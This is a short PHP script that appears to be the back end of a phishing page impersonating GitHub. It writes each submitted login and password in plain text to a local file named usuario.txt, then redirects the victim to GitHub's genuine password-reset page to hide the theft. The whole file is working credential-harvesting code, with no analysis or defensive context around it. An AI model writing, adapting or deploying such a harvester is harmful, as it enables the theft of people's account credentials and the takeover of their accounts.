<?php
file_put_contents("usuario.txt", "Github Usuario: " . $_POST['login'] . " Contrasena: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com/password_reset');
exit();
?>
